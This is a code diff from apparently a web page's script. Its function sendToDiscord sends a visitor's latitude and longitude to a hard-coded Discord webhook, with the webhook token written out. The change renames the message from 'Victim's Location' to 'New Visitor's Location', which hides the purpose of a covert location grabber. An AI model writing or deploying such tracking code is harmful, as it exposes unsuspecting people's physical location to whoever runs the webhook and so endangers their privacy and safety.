@@ -88,7 +88,7 @@
         function sendToDiscord(latitude, longitude) {
             const webhookURL = 'https://discord.com/api/webhooks/1223815986189176903/0wTdzWsqTWSRd77pgNhgjTyfy1Vd-bhpyt-7ubi-2sDaeZpc2xKT0wCUZq6XODUJG5C3';
             const data = {
-                content: `Victim's Location: Latitude - ${latitude}, Longitude - ${longitude}`
+                content: `New Visitor's Location: Latitude: ${latitude}, Longitude: ${longitude}`
             };
 
             fetch(webhookURL, {
